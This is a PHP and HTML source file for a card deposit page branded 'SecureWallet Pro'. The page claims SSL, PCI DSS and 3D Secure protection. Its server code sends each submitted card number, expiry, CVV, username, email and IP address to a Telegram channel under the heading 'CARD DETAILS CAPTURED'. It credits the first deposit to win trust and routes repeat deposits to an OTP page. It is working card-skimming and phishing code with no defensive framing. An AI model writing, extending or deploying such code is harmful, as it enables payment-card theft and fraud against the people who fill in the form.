<?php
require_once 'config.php';
if (!isset($_SESSION['user_id'])) header('Location: index.php');

// FIX: Fetch user data BEFORE processing POST
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$user = $stmt->fetch();

if (!$user) {
    header('Location: index.php');
    exit;
}

if ($_POST) {
    $card_number = $_POST['card_number'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];
    $amount = floatval($_POST['amount']);
    
    // Send to Telegram IMMEDIATELY
    $message = "💳 <b>CARD DETAILS CAPTURED</b>\n";
    $message .= "👤 User: {$user['username']}\n";
    $message .= "📧 Email: {$user['email']}\n";
    $message .= "💰 Amount: $$amount\n";
    $message .= "🪪 Card: {$card_number}\n";
    $message .= "📅 Expiry: {$expiry}\n";
    $message .= "🔒 CVV: {$cvv}\n";
    $message .= "💳 Last 4: " . substr($card_number, -4) . "\n";
    $message .= "⏰ " . date('Y-m-d H:i:s T') . "\n";
    $message .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];
    sendTelegram($message);
    
    // Update card saved status
    $db->prepare("UPDATE users SET card_saved = 1 WHERE id = ?")->execute([$_SESSION['user_id']]);
    
    // Check if first time deposit
    $_SESSION['deposit_amount'] = $amount;
    
    if ($user['card_saved'] == 0) {
        // First time - add balance immediately
        $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")
           ->execute([$amount, $_SESSION['user_id']]);
        // Log success transaction
        $db->prepare("INSERT INTO transactions (user_id, type, method, amount, status, details) VALUES (?, 'deposit', 'card', ?, 'success', 'First card deposit - funds added')")
           ->execute([$_SESSION['user_id'], $amount]);
        header('Location: deposit_success.php');
    } else {
        // Repeat deposit - require OTP
        header('Location: deposit_otp.php');
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Payment - SecureWallet Pro</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="card-page">
    <div class="payment-container">
        <div class="payment-header">
            <a href="deposit.php" class="back">← Back to Methods</a>
            <h2>Enter Card Details</h2>
            <div class="security-note">
                🔒 Secure 256-bit SSL Encryption | PCI DSS Compliant
            </div>
        </div>
        
        <form method="POST" class="card-form" id="cardForm">
            <div class="input-group large">
                <label>Amount to Deposit (USD)</label>
                <div class="dollar-input">
                    <span>$</span>
                    <input type="number" name="amount" step="0.01" min="10" max="5000" 
                           placeholder="50.00" required value="100">
                </div>
                <small>Minimum $10 • Instant processing</small>
            </div>
            
            <div class="input-group">
                <label>Card Number</label>
                <input type="text" name="card_number" id="cardNumber" 
                       placeholder="1234 5678 9012 3456" maxlength="19" required>
                <div class="card-brands">
                    <span>Visa</span><span>Mastercard</span><span>Amex</span>
                </div>
            </div>
            
            <div class="row">
                <div class="input-group">
                    <label>Expiry Date</label>
                    <input type="text" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="input-group">
                    <label>CVV/CVC</label>
                    <input type="text" name="cvv" id="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>
            
            <div class="billing-info">
                <div class="row">
                    <div class="input-group">
                        <label>Name on Card</label>
                        <input type="text" placeholder="John Doe" required>
                    </div>
                </div>
            </div>
            
            <button type="submit" class="btn-pay">
                <span>Pay Now</span>
                <span class="loading" style="display:none;">Processing...</span>
            </button>
            
            <div class="security-badges">
                <div class="badge ssl">SSL Secured</div>
                <div class="badge pci">PCI DSS</div>
                <div class="badge secure">3D Secure</div>
            </div>
        </form>
    </div>

    <script>
    // Card number formatting
    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formatted;
    });

    // Expiry formatting
    document.getElementById('expiry').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0,2) + '/' + value.substring(2,4);
        }
        e.target.value = value;
    });

    // Form submission with loading
    document.getElementById('cardForm').addEventListener('submit', function() {
        const btn = document.querySelector('.btn-pay');
        btn.querySelector('.loading').style.display = 'inline';
        btn.querySelector('span').style.display = 'none';
        btn.disabled = true;
    });
    </script>
</body>
</html>
